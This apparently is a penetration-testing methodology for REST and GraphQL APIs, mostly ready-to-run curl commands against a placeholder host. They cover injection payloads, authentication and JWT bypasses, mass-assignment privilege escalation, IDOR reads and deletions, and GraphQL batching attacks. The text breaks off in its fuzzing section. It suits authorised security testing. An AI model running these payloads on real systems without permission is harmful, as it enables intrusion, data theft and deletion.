# API Testing Rules — Comprehensive Methodology

## Table of Contents

1. [REST API Testing Fundamentals](#1-rest-api-testing-fundamentals)
2. [Parameter Manipulation](#2-parameter-manipulation)
3. [HTTP Method Override](#3-http-method-override)
4. [Content-Type Switching](#4-content-type-switching)
5. [Authentication Testing](#5-authentication-testing)
6. [API Version Diffing](#6-api-version-diffing)
7. [IDOR on CRUD Operations](#7-idor-on-crud-operations)
8. [Mass Assignment](#8-mass-assignment)
9. [GraphQL Testing](#9-graphql-testing)
10. [API Fuzzing](#10-api-fuzzing)
11. [CORS Testing](#11-cors-testing)
12. [Rate Limit Testing](#12-rate-limit-testing)
13. [API Documentation Discovery](#13-api-documentation-discovery)
14. [Error Handling Analysis](#14-error-handling-analysis)
15. [JWT Token Testing](#15-jwt-token-testing)
16. [Business Logic Flaws](#16-business-logic-flaws)
17. [Server-Side Request Forgery](#17-server-side-request-forgery)
18. [SQL Injection via API](#18-sql-injection-via-api)
19. [NoSQL Injection](#19-nosql-injection)
20. [XML External Entities](#20-xml-external-entities)
21. [Path Traversal](#21-path-traversal)
22. [Insecure Direct Object References Advanced](#22-insecure-direct-object-references-advanced)
23. [API Key Leakage](#23-api-key-leakage)
24. [WebSocket API Testing](#24-websocket-api-testing)
25. [File Upload via API](#25-file-upload-via-api)

---

## 1. REST API Testing Fundamentals

### 1.1 Core Testing Principles

Every REST API endpoint must be tested against the following baseline:

```
Method: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
Headers: Content-Type, Accept, Authorization, X-API-Key, Origin
Parameters: Query string, Path params, Request body, Headers
Authentication: None, Token, Basic, OAuth, API Key, Cookie
```

### 1.2 Endpoint Inventory Checklist

Before testing, build a complete endpoint inventory:

```bash
# Discover endpoints from JavaScript files
curl -s "https://api.target.com/v1/users" -H "Authorization: Bearer $TOKEN" | jq .

# Enumerate with common path patterns
for path in users admin config health metrics swagger.json api-docs graphql v1 v2 v3; do
  echo "=== $path ==="
  curl -s -o /dev/null -w "%{http_code}" "https://api.target.com/$path"
done
```

### 1.3 HTTP Status Code Reference

| Code | Meaning | Testing Implication |
|------|---------|---------------------|
| 200  | OK      | Success — inspect response body |
| 201  | Created | Resource created — check location header |
| 204  | No Content | Deletion/update success |
| 301/302 | Redirect | Follow redirects — may bypass auth |
| 400  | Bad Request | Server parsed input — check error message |
| 401  | Unauthorized | Auth required — try without token |
| 403  | Forbidden | Authenticated but not authorized |
| 404  | Not Found | Resource/endpoint doesn't exist |
| 405  | Method Not Allowed | Try other HTTP methods |
| 429  | Too Many Requests | Rate limiting active |
| 500  | Internal Server Error | May leak stack traces |
| 502/503 | Gateway Error | May expose internal infrastructure |

---

## 2. Parameter Manipulation

### 2.1 Query String Manipulation

Test every parameter for injection, type confusion, and boundary conditions.

```bash
# Baseline request
curl -s "https://api.target.com/api/users?limit=10&offset=0" \
  -H "Authorization: Bearer $TOKEN" | jq .

# Negative values
curl -s "https://api.target.com/api/users?limit=-1&offset=0"

# Extremely large values
curl -s "https://api.target.com/api/users?limit=9999999999&offset=0"

# String instead of integer
curl -s "https://api.target.com/api/users?limit=abc&offset=def"

# Special characters
curl -s "https://api.target.com/api/users?limit=10%00&offset=0"

# SQL-like injection
curl -s "https://api.target.com/api/users?limit=10' OR '1'='1&offset=0"

# NoSQL injection
curl -s 'https://api.target.com/api/users?limit=10&offset[$gt]=0'

# Array injection
curl -s "https://api.target.com/api/users?id[]=1&id[]=2"
```

### 2.2 Path Parameter Manipulation

```bash
# Path traversal in path params
curl -s "https://api.target.com/api/users/../admin"
curl -s "https://api.target.com/api/users/..%2fadmin"
curl -s "https://api.target.com/api/users/%2e%2e%2fadmin"

# Type confusion in path params
curl -s "https://api.target.com/api/users/null"
curl -s "https://api.target.com/api/users/undefined"
curl -s "https://api.target.com/api/users/NaN"
curl -s "https://api.target.com/api/users/0"
curl -s "https://api.target.com/api/users/-1"
curl -s "https://api.target.com/api/users/1e10"

# Array-like path params
curl -s "https://api.target.com/api/users/1,2,3"
curl -s "https://api.target.com/api/users/1%2C2%2C3"

# Wildcard attempts
curl -s "https://api.target.com/api/users/*"
curl -s "https://api.target.com/api/users/%"
curl -s "https://api.target.com/api/users/_"
```

### 2.3 POST/PUT Body Parameter Manipulation

```bash
# Valid baseline request
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"test","email":"test@test.com","role":"user"}'

# Extra unexpected fields
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@test.com","role":"user","is_admin":true}'

# Null values
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{"name":null,"email":null,"role":"user"}'

# Empty strings
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{"name":"","email":"","role":""}'

# Nested objects
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{"name":{"$ne":""},"email":"test@test.com","role":"user"}'

# Duplicate keys (last one wins)
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","name":"admin","email":"test@test.com"}'
```

### 2.4 Mass Parameter Assignment

```bash
# Test for mass assignment vulnerabilities
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{
    "name":"test",
    "email":"test@test.com",
    "role":"admin",
    "is_admin":true,
    "is_superuser":true,
    "permissions":["*"],
    "account_status":"active",
    "verified":true,
    "email_verified":true,
    "balance":999999,
    "credit":999999,
    "admin_level":10,
    "access_level":100,
    "group":"administrators",
    "organization_id":1,
    "team_id":1,
    "subscription_plan":"enterprise",
    "tier":"premium",
    "is_approved":true,
    "approved":true,
    "active":true,
    "can_delete":true,
    "can_edit":true,
    "can_create":true,
    "can_promote":true,
    "is_moderator":true,
    "is_owner":true,
    "two_factor_enabled":false,
    "mfa_disabled":true
  }'
```

---

## 3. HTTP Method Override

### 3.1 Standard Method Override Headers

```bash
# X-HTTP-Method-Override
curl -s -X GET "https://api.target.com/api/users/1" \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Authorization: Bearer $TOKEN"

# X-HTTP-Method
curl -s -X GET "https://api.target.com/api/users/1" \
  -H "X-HTTP-Method: DELETE"

# X-Method-Override
curl -s -X GET "https://api.target.com/api/users/1" \
  -H "X-Method-Override: DELETE"

# Using POST with override
curl -s -X POST "https://api.target.com/api/users/1" \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Content-Type: application/json" \
  -d '{}'
```

### 3.2 Alternative Method Override Techniques

```bash
# URL parameter override
curl -s "https://api.target.com/api/users/1?_method=DELETE"

# Form parameter override (for form-encoded requests)
curl -s -X POST "https://api.target.com/api/users/1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "_method=DELETE"

# JSON body override
curl -s -X POST "https://api.target.com/api/users/1" \
  -H "Content-Type: application/json" \
  -d '{"_method":"DELETE"}'

# HTTP Verb Tampering — trying all methods on each endpoint
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  echo "=== $method ==="
  curl -s -X $method "https://api.target.com/api/admin/users" \
    -H "Authorization: Bearer $TOKEN" \
    -w "\nHTTP: %{http_code}\n"
done
```

### 3.3 TRACE Method Testing

```bash
# TRACE method may echo headers (useful for XST attacks)
curl -s -X TRACE "https://api.target.com/api/" \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-Custom: test"

# CONNECT method
curl -s -X CONNECT "https://api.target.com:443" \
  -H "Host: internal-server:8080"
```

---

## 4. Content-Type Switching

### 4.1 JSON vs XML vs Form-Encoded

```bash
# JSON
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@test.com"}'

# XML
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/xml" \
  -d '<user><name>test</name><email>test@test.com</email></user>'

# Form-encoded
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=test&email=test@test.com"

# Plain text
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: text/plain" \
  -d '{"name":"test","email":"test@test.com"}'

# YAML
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/x-yaml" \
  -d "name: test\nemail: test@test.com"

# Multipart form
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: multipart/form-data" \
  -F "name=test" -F "email=test@test.com"
```

### 4.2 Content-Type Manipulation Attacks

```bash
# Switching content type to bypass WAF/input validation
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{"name":"<script>alert(1)</script>","email":"test@test.com"}'

# Same payload as XML
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/xml" \
  -d '<user><name><![CDATA[<script>alert(1)</script>]]></name><email>test@test.com</email></user>'

# Accept header manipulation
curl -s "https://api.target.com/api/users" \
  -H "Accept: application/xml" \
  -H "Authorization: Bearer $TOKEN"

curl -s "https://api.target.com/api/users" \
  -H "Accept: text/html" \
  -H "Authorization: Bearer $TOKEN"

# Content-Type with charset
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/json; charset=utf-16" \
  -d '{"name":"test","email":"test@test.com"}'

# Content-Type confusion (JSON but sent as form)
curl -s -X POST "https://api.target.com/api/users" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d '{"name":"test","email":"test@test.com","role":"admin"}'
```

### 4.3 Accept Header Manipulation

```bash
# Request different response formats
curl -s "https://api.target.com/api/users/1" \
  -H "Accept: application/json" \
  -H "Authorization: Bearer $TOKEN"

curl -s "https://api.target.com/api/users/1" \
  -H "Accept: text/csv" \
  -H "Authorization: Bearer $TOKEN"

curl -s "https://api.target.com/api/users/1" \
  -H "Accept: text/html" \
  -H "Authorization: Bearer $TOKEN"

curl -s "https://api.target.com/api/users/1" \
  -H "Accept: application/octet-stream" \
  -H "Authorization: Bearer $TOKEN"

# Wildcard accept
curl -s "https://api.target.com/api/users/1" \
  -H "Accept: */*"

# Quality values
curl -s "https://api.target.com/api/users/1" \
  -H "Accept: application/json;q=0.1,text/html;q=0.9"
```

---

## 5. Authentication Testing

### 5.1 Bypassing Authentication

```bash
# No auth header at all
curl -s "https://api.target.com/api/admin/users"

# Empty auth header
curl -s "https://api.target.com/api/admin/users" \
  -H "Authorization: "

# Invalid token format
curl -s "https://api.target.com/api/admin/users" \
  -H "Authorization: Bearer invalid"

# Null token
curl -s "https://api.target.com/api/admin/users" \
  -H "Authorization: Bearer null"

# Undefined token
curl -s "https://api.target.com/api/admin/users" \
  -H "Authorization: Bearer undefined"

# Token as query parameter (if supported)
curl -s "https://api.target.com/api/admin/users?token=$TOKEN"

# Token in POST body
curl -s -X POST "https://api.target.com/api/admin/users" \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\"}"

# Alternative auth headers
curl -s "https://api.target.com/api/admin/users" \
  -H "X-API-Key: $TOKEN"

curl -s "https://api.target.com/api/admin/users" \
  -H "X-Auth-Token: $TOKEN"

curl -s "https://api.target.com/api/admin/users" \
  -H "X-Token: $TOKEN"

curl -s "https://api.target.com/api/admin/users" \
  -H "Api-Key: $TOKEN"

curl -s "https://api.target.com/api/admin/users" \
  -H "X-Forwarded-User: admin"

curl -s "https://api.target.com/api/admin/users" \
  -H "X-Auth-Username: admin"

# Cookie-based auth bypass
curl -s "https://api.target.com/api/admin/users" \
  -H "Cookie: session=admin; auth=true; admin=true"
```

### 5.2 Authentication on Every Endpoint

Test each endpoint with and without auth:

```bash
# Define endpoints to test
endpoints=(
  "GET:https://api.target.com/api/users"
  "GET:https://api.target.com/api/users/1"
  "POST:https://api.target.com/api/users"
  "PUT:https://api.target.com/api/users/1"
  "PATCH:https://api.target.com/api/users/1"
  "DELETE:https://api.target.com/api/users/1"
  "GET:https://api.target.com/api/admin/users"
  "GET:https://api.target.com/api/settings"
  "GET:https://api.target.com/api/config"
  "GET:https://api.target.com/api/health"
  "GET:https://api.target.com/api/metrics"
  "GET:https://api.target.com/api/logs"
  "GET:https://api.target.com/api/audit"
  "GET:https://api.target.com/api/analytics"
  "GET:https://api.target.com/api/reports"
  "POST:https://api.target.com/api/export"
  "POST:https://api.target.com/api/import"
)

for endpoint in "${endpoints[@]}"; do
  method="${endpoint%%:*}"
  url="${endpoint#*:}"
  echo "=== No Auth: $method $url ==="
  curl -s -X "$method" "$url" -w "\nHTTP: %{http_code}\n"
  echo "---"
  echo "=== With Auth: $method $url ==="
  curl -s -X "$method" "$url" \
    -H "Authorization: Bearer $TOKEN" \
    -w "\nHTTP: %{http_code}\n"
  echo "---"
done
```

### 5.3 Token Handling Tests

```bash
# Expired token
curl -s "https://api.target.com/api/users" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MTYyMzkwMjJ9.abc123"

# Token without expiry
curl -s "https://api.target.com/api/users" \
  -H "Authorization: Bearer $TOKEN_WITHOUT_EXP"

# Token manipulation
# Change algorithm to 'none'
curl -s "https://api.target.com/api/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."

# Token replay (capture and resend)
# Capture token from one session, use in another
TOKEN_CAPTURED=$(curl -s -X POST "https://api.target.com/auth/login" \
  -d "username=alice&password=alicepass" | jq -r '.token')

curl -s "https://api.target.com/api/users" \
  -H "Authorization: Bearer $TOKEN_CAPTURED"
```

---

## 6. API Version Diffing

### 6.1 Version Discovery

```bash
# Common version paths
for version in v1 v2 v3 v1.1 v2.1 v3.0 api latest stable beta alpha dev; do
  echo "=== $version ==="
  curl -s -o /dev/null -w "%{http_code}" \
    "https://api.target.com/$version/users"
done

# Version in header
curl -s "https://api.target.com/api/users" \
  -H "Accept-Version: v1"

curl -s "https://api.target.com/api/users" \
  -H "Accept-Version: v2"

# Version as query param
curl -s "https://api.target.com/api/users?version=1"
curl -s "https://api.target.com/api/users?version=2"

# Version in content type
curl -s "https://api.target.com/api/users" \
  -H "Accept: application/vnd.target.v1+json"

curl -s "https://api.target.com/api/users" \
  -H "Accept: application/vnd.target.v2+json"
```

### 6.2 Diffing v1 vs v2

```bash
# Compare responses between versions
response_v1=$(curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/users/1")

response_v2=$(curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v2/users/1")

# Check for fields present in v1 but not v2
echo "$response_v1" | jq 'keys' | sort > /tmp/v1_keys.txt
echo "$response_v2" | jq 'keys' | sort > /tmp/v2_keys.txt
diff /tmp/v1_keys.txt /tmp/v2_keys.txt

# Old endpoints removed in v2
for ep in legacy_deprecated old_endpoint obsolete; do
  echo "=== v1/$ep ==="
  curl -s -o /dev/null -w "%{http_code}" \
    "https://api.target.com/v1/$ep"
  echo "=== v2/$ep ==="
  curl -s -o /dev/null -w "%{http_code}" \
    "https://api.target.com/v2/$ep"
done
```

### 6.3 Version-Specific Vulnerabilities

```bash
# Check if auth differs between versions
curl -s "https://api.target.com/v1/admin/users"
curl -s "https://api.target.com/v2/admin/users"

# Check if rate limiting differs
for i in {1..20}; do
  curl -s -o /dev/null -w "%{http_code}\n" "https://api.target.com/v1/users" &
  curl -s -o /dev/null -w "%{http_code}\n" "https://api.target.com/v2/users" &
done
wait

# Old vulnerable endpoint still accessible
curl -s "https://api.target.com/v1/users/search?q=<script>"
curl -s "https://api.target.com/v2/users/search?q=<script>"
```

---

## 7. IDOR on CRUD Operations

### 7.1 User ID Enumeration

```bash
# Sequential ID enumeration
for id in 1 2 3 4 5 10 100 1000 10000 -1 0; do
  echo "=== User ID: $id ==="
  curl -s "https://api.target.com/api/users/$id" \
    -H "Authorization: Bearer $TOKEN" \
    -w "\nHTTP: %{http_code}\n"
done

# UUID enumeration
for uuid in "00000000-0000-0000-0000-000000000000" \
            "11111111-1111-1111-1111-111111111111" \
            "ffffffff-ffff-ffff-ffff-ffffffffffff"; do
  echo "=== UUID: $uuid ==="
  curl -s "https://api.target.com/api/users/$uuid" \
    -H "Authorization: Bearer $TOKEN" \
    -w "\nHTTP: %{http_code}\n"
done
```

### 7.2 Cross-Resource IDOR

```bash
# Access other user's data
USER_A_TOKEN="..."
USER_B_ID=5

curl -s "https://api.target.com/api/users/$USER_B_ID/profile" \
  -H "Authorization: Bearer $USER_A_TOKEN"

curl -s "https://api.target.com/api/users/$USER_B_ID/orders" \
  -H "Authorization: Bearer $USER_A_TOKEN"

curl -s "https://api.target.com/api/users/$USER_B_ID/payment-methods" \
  -H "Authorization: Bearer $USER_A_TOKEN"

curl -s "https://api.target.com/api/users/$USER_B_ID/documents" \
  -H "Authorization: Bearer $USER_A_TOKEN"

curl -s "https://api.target.com/api/users/$USER_B_ID/notifications" \
  -H "Authorization: Bearer $USER_A_TOKEN"

curl -s "https://api.target.com/api/users/$USER_B_ID/activity" \
  -H "Authorization: Bearer $USER_A_TOKEN"

curl -s "https://api.target.com/api/users/$USER_B_ID/messages" \
  -H "Authorization: Bearer $USER_A_TOKEN"
```

### 7.3 IDOR on All CRUD Operations

```bash
# For each resource type, test GET, POST, PUT, PATCH, DELETE
# Resource: Orders

# GET — view another user's order
curl -s "https://api.target.com/api/orders/101" \
  -H "Authorization: Bearer $USER_A_TOKEN"

# POST — create order for another user
curl -s -X POST "https://api.target.com/api/orders" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_A_TOKEN" \
  -d '{"user_id":5,"product":"laptop","quantity":1}'

# PUT — update another user's order
curl -s -X PUT "https://api.target.com/api/orders/101" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_A_TOKEN" \
  -d '{"status":"cancelled"}'

# PATCH — partial update
curl -s -X PATCH "https://api.target.com/api/orders/101" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_A_TOKEN" \
  -d '{"quantity":999}'

# DELETE — delete another user's order
curl -s -X DELETE "https://api.target.com/api/orders/101" \
  -H "Authorization: Bearer $USER_A_TOKEN"

# Bulk operations
curl -s "https://api.target.com/api/orders?user_id=5&limit=100" \
  -H "Authorization: Bearer $USER_A_TOKEN"

# Nested resource IDOR
curl -s "https://api.target.com/api/orders/101/items/1" \
  -H "Authorization: Bearer $USER_A_TOKEN"

curl -s "https://api.target.com/api/orders/101/invoice" \
  -H "Authorization: Bearer $USER_A_TOKEN"
```

### 7.4 IDOR via Indirect References

```bash
# Email as identifier
curl -s "https://api.target.com/api/users?email=admin@target.com" \
  -H "Authorization: Bearer $USER_A_TOKEN"

# Username as identifier
curl -s "https://api.target.com/api/users?username=admin" \
  -H "Authorization: Bearer $USER_A_TOKEN"

# From query parameters
curl -s "https://api.target.com/api/documents?owner_id=1" \
  -H "Authorization: Bearer $USER_A_TOKEN"

# Through referral codes
curl -s "https://api.target.com/api/referrals?referred_by=admin123" \
  -H "Authorization: Bearer $USER_A_TOKEN"

# Invoice/Receipt ID
for i in $(seq 1000 1020); do
  curl -s "https://api.target.com/api/invoices/$i" \
    -H "Authorization: Bearer $USER_A_TOKEN" \
    -w "\nInvoice $i: %{http_code}\n"
done
```

### 7.5 IDOR Detection Methodology

```
Step 1: Register User A and User B
Step 2: User A creates resources (orders, documents, etc.)
Step 3: Capture User A's resource IDs from response
Step 4: Use User B's token to access User A's resources
Step 5: Look for pattern: /api/{resource}/{id}
Step 6: Try GUID-based IDs — swap GUIDs between resources
Step 7: Check all HTTP methods on accessed resources
Step 8: Verify by checking if sensitive data is returned
```

---

## 8. Mass Assignment

### 8.1 User Registration Mass Assignment

```bash
# Test all possible privileged fields during registration
curl -s -X POST "https://api.target.com/api/auth/register" \
  -H "Content-Type: application/json" \
  -d '{
    "name":"attacker",
    "email":"attacker@test.com",
    "password":"Password123!",
    "role":"admin",
    "is_admin":true,
    "is_active":true,
    "is_verified":true,
    "email_verified_at":"2025-01-01T00:00:00Z",
    "verification_token":null,
    "credit":999999,
    "balance":999999,
    "points":9999999,
    "tier":"premium",
    "subscription":"enterprise",
    "group_id":1,
    "organization_id":1,
    "team_id":1,
    "account_type":"admin",
    "user_type":"administrator",
    "permissions":["read","write","delete","admin"],
    "scopes":["admin"],
    "flags":["verified","premium"],
    "settings":{"notifications":true,"admin_access":true}
  }'
```

### 8.2 Profile Update Mass Assignment

```bash
# After logging in, update profile with privileged fields
curl -s -X PUT "https://api.target.com/api/users/me" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "name":"attacker",
    "email":"attacker@test.com",
    "role":"admin",
    "is_admin":true,
    "credit":999999,
    "balance":999999,
    "subscription_tier":"enterprise",
    "account_status":"active",
    "email_verified":true,
    "is_verified":true,
    "bypass_2fa":true,
    "mfa_disabled":true,
    "login_attempts":0,
    "locked_at":null,
    "banned_until":null,
    "deleted_at":null
  }'
```

### 8.3 Common Mass Assignment Fields

```bash
# Comprehensive list of fields to test
fields=(
  "is_admin"
  "is_superuser"  
  "is_staff"
  "is_moderator"
  "is_owner"
  "is_verified"
  "is_active"
  "is_approved"
  "role"
  "roles"
  "permissions"
  "scopes"
  "user_type"
  "account_type"
  "tier"
  "plan"
  "subscription"
  "group"
  "groups"
  "team"
  "organization"
  "credit"
  "balance"
  "points"
  "reputation"
  "score"
  "rating"
  "admin"
  "admin_level"
  "access_level"
  "clearance"
  "level"
  "privilege"
  "privileges"
  "capabilities"
  "features"
  "flags"
  "status"
  "state"
  "email_verified"
  "phone_verified"
  "verified_at"
  "approved_at"
  "locked"
  "banned"
  "suspended"
  "disabled"
  "deleted"
  "archived"
  "hidden"
  "private"
  "confirmed"
  "accepted"
  "consent"
  "terms_accepted"
  "tos_accepted"
  "marketing_opt_in"
  "notification_settings"
  "privacy_settings"
  "security_settings"
  "2fa_enabled"
  "two_factor_enabled"
  "mfa_enabled"
  "otp_enabled"
  "totp_enabled"
  "bypass_2fa"
  "mfa_disabled"
  "2fa_disabled"
)

for field in "${fields[@]}"; do
  echo "Testing: $field"
  curl -s -X PATCH "https://api.target.com/api/users/me" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d "{\"$field\":true}" | jq '.'
done
```

### 8.4 Nested Mass Assignment

```bash
# Test nested object assignment
curl -s -X PUT "https://api.target.com/api/users/me" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "profile": {
      "role": "admin",
      "is_admin": true,
      "settings": {
        "admin_access": true,
        "can_delete_users": true
      }
    },
    "account": {
      "type": "admin",
      "tier": "enterprise"
    }
  }'

# Array-based mass assignment
curl -s -X PUT "https://api.target.com/api/users/me" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "roles": ["admin", "superuser"],
    "permissions": ["*"],
    "groups": [{"id": 1, "name": "administrators"}]
  }'
```

---

## 9. GraphQL Testing

### 9.1 Introspection Query

```bash
# Basic introspection — if enabled, reveals entire schema
curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { types { name fields { name type { name kind } } } } }"
  }'

# Full introspection
curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } }"
  }'

# If introspection is disabled, try field suggestions
curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'
```

### 9.2 Field Suggestion Probing

```bash
# When introspection is blocked, probe field names manually
# Try common field names and check error messages for hints
for field in users user admin config settings profile orders payment; do
  curl -s -X POST "https://api.target.com/graphql" \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{ $field { id } }\"}" | jq '.'
done

# Use aliases to probe multiple fields in one request
curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{
      u1: __type(name: \"User\") { name fields { name } }
      u2: __type(name: \"Query\") { name fields { name } }
      u3: __type(name: \"Mutation\") { name fields { name } }
      u4: __type(name: \"Admin\") { name fields { name } }
    }"
  }'

# Error-based field discovery
curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ nonexistent { id } }"}'
```

### 9.3 Query Depth Analysis

```bash
# Test for deep query limits
depth_query="{"
for i in $(seq 1 100); do
  depth_query+="a$i {"
done
depth_query+="id"
for i in $(seq 1 100); do
  depth_query+="}"
done
depth_query+="}"

curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d "{\"query\":\"$depth_query\"}"

# Recursive fragment depth
curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { users { ...UserFields } } fragment UserFields on User { id name posts { ...PostFields } } fragment PostFields on Post { id title author { ...UserFields } }"
  }'
```

### 9.4 Batching Attacks

```bash
# Batch multiple queries in one request to bypass rate limits
curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"{ user(id:1) { email } }"},
    {"query":"{ user(id:2) { email } }"},
    {"query":"{ user(id:3) { email } }"},
    {"query":"{ user(id:4) { email } }"},
    {"query":"{ user(id:5) { email } }"},
    {"query":"{ user(id:6) { email } }"},
    {"query":"{ user(id:7) { email } }"},
    {"query":"{ user(id:8) { email } }"},
    {"query":"{ user(id:9) { email } }"},
    {"query":"{ user(id:10) { email } }"}
  ]'

# Batch with aliases (single query, multiple lookups)
curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{
      u1: user(id: 1) { id email role }
      u2: user(id: 2) { id email role }
      u3: user(id: 3) { id email role }
      u4: user(id: 4) { id email role }
      u5: user(id: 5) { id email role }
    }"
  }'
```

### 9.5 Auth on Mutations

```bash
# Test mutations without auth
curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { deleteUser(id: 1) { success } }"
  }'

# Test mutations with auth
curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "query": "mutation { deleteUser(id: 1) { success } }"
  }'

# Privilege escalation via mutation
curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_A_TOKEN" \
  -d '{
    "query": "mutation { updateUserRole(id: 1, role: admin) { id role } }"
  }'

curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_A_TOKEN" \
  -d '{
    "query": "mutation { createAdminToken(userId: 1) { token } }"
  }'
```

### 9.6 GraphQL Specific Attacks

```bash
# Argument injection
curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query($id: Int!) { user(id: $id) { email password } }",
    "variables": {"id": 1}
  }'

# SQL injection through GraphQL
curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ users(search: \"'\'' OR 1=1 --\") { id email } }"
  }'

# NoSQL injection
curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ users(filter: {email: {\"$regex\": \".*@target.com\"}}) { id email } }"
  }'

# Direct field access — requesting password/secret fields
curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ users { id email password passwordHash password_reset_token secret api_key ssn credit_card } }"
  }'

# Circular query (aliases can amplify)
curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { a: users { ...f } b: users { ...f } c: users { ...f } d: users { ...f } e: users { ...f } f: users { ...f } g: users { ...f } h: users { ...f } } fragment f on User { id name email posts { id title comments { id text author { ...f } } } }"
  }'
```

### 9.7 GraphQL Batching Rate Limit Bypass

```bash
# Bypass rate limits by sending all queries in one request
generate_batch() {
  local count=$1
  local query="["
  for i in $(seq 1 $count); do
    if [ $i -gt 1 ]; then query+=","; fi
    query+="{\"query\":\"{ user(id:$i) { id email name role } }\"}"
  done
  query+="]"
  echo "$query"
}

curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d "$(generate_batch 50)"

# Persistent query batching
curl -s -X POST "https://api.target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { createUsers(input: [
      {name:\"a\",email:\"a@t.com\"},
      {name:\"b\",email:\"b@t.com\"},
      {name:\"c\",email:\"c@t.com\"},
      {name:\"d\",email:\"d@t.com\"},
      {name:\"e\",email:\"e@t.com\"}
    ]) { id name } }"
  }'
```

---

## 10. API Fuzzing

### 10.1 Parameter Type Fuzzing

```bash
# Integer parameter fuzzing
for val in null undefined 0 -1 1 9999999999999 1.1 1.999999 1e10 NaN inf -inf "" " " "'" "\"" "\\" "<>" "{}" "[]" "()" ";"; do
  curl -s "https://api.target.com/api/users?limit=$val" \
    -H "Authorization: Bearer $TOKEN" \
    -w "\nlimit=$val -> %{http_code}\n"
done

# String parameter fuzzing
